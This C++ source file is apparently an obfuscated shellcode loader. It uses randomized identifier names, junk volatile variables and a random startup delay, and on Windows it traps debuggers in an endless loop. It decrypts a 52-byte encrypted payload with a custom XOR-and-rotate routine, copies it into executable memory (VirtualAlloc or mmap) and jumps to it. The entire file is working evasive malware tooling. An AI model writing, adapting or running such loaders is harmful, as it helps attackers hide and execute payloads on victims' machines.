/* Unique ID: 6511234429656210040 */
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool ZX3_1UdnoBLM() {
#ifdef _WIN32
    if (IsDebuggerPresent()) {
        // Infinite loop with anti-optimization
        volatile int* p = (volatile int*)malloc(1024);
        while (1) {
            for (int i = 0; i < 256; i++) {
                p[i] = p[i] ^ 0xDEADBEEF;
                __asm { pause }
            }
        }
    }
#endif
    return true;
}

std::vector<uint8_t> dkGsvDLY9LpR(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key[i % key.size()];
        result[i] = (result[i] >> 3) | (result[i] << 5);
        result[i] ^= i & 0xFF;
    }
    return result;
}

int main() {
    ZX3_1UdnoBLM();

    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 515);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    volatile int uSi0MUquo = 523;
    volatile int Lk8Y6Gq4S = 24;
    {
        auto i1NUvRLwZ6xF = []() { return 49; };
        volatile int uwFOGvXyQPll_ = i1NUvRLwZ6xF();
    }
    volatile int axQozXoD7 = 158;
    volatile int TE23Qk8S = 584;
    volatile int AiGKEWz2CZA2i70 = 233;
    volatile int X86CWUGO = 614;
    volatile int UMoF0kCtJ8leCY = 886;
    volatile int BxhUyi_X = 512;
    volatile int TYP2u8xLv8xmrH = 361;
    std::vector<uint8_t> YgtYyqVPWnol = {
        0xd5, 0x77, 0x99, 0x7b, 0x65, 0xa4, 0xf6, 0x88, 0x36, 0x88, 0xf0, 0xbb, 0xa4, 0xe2, 0x30, 0x9d, 
        0xe3, 0x16, 0x63, 0x63, 0xf6, 0x11, 0x92, 0x55, 0x8d, 0xf3, 0x17, 0x78, 0xc0, 0x1f, 0xc6, 0x79, 
        0x56, 0x3f, 0x81, 0xdb, 0xd7, 0x04, 0xce, 0x0a, 0x56, 0xd2, 0x00, 0xb1, 0xbc, 0x4a, 0x8a, 0x75, 
        0xc2, 0xd7, 0x62, 0x62
    };

    std::vector<uint8_t> jX1CuYsXsHI7wVGz = {
        0xee, 0xa6, 0x1a, 0x7c, 0x0c, 0x5d, 0x6d, 0xd1, 0xa6, 0x10, 0x2b, 0x73, 0x66, 0x89, 0xe7, 0x3f, 
        0x37, 0xb2, 0x6d, 0x20, 0x39, 0xf8, 0xf5, 0x68, 0xd4, 0x34, 0xcd, 0x09, 0xbb, 0x26, 0x74, 0xbe
    };

    volatile int LDsm_8UbFWCD = 136;
    volatile int bSw3QLF9HnwamJk = 252;
    volatile int xj8GtA4Yj = 185;
    volatile int lMDCcJSPbal = 300;
    volatile int Sl9ZGSa8l9APHrp = 540;
    std::vector<uint8_t> YBmlbPT5w = dkGsvDLY9LpR(YgtYyqVPWnol, jX1CuYsXsHI7wVGz);

#ifdef _WIN32
    LPVOID nfJ7Y2gqzZLaNw5u = VirtualAlloc(NULL, YBmlbPT5w.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (nfJ7Y2gqzZLaNw5u) {
        memcpy(nfJ7Y2gqzZLaNw5u, YBmlbPT5w.data(), YBmlbPT5w.size());
        ((void(*)())nfJ7Y2gqzZLaNw5u)();
    }
#else
    void* nfJ7Y2gqzZLaNw5u = mmap(NULL, YBmlbPT5w.size(), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (nfJ7Y2gqzZLaNw5u != MAP_FAILED) {
        memcpy(nfJ7Y2gqzZLaNw5u, YBmlbPT5w.data(), YBmlbPT5w.size());
        ((void(*)())nfJ7Y2gqzZLaNw5u)();
    }
#endif
    return 0;
}
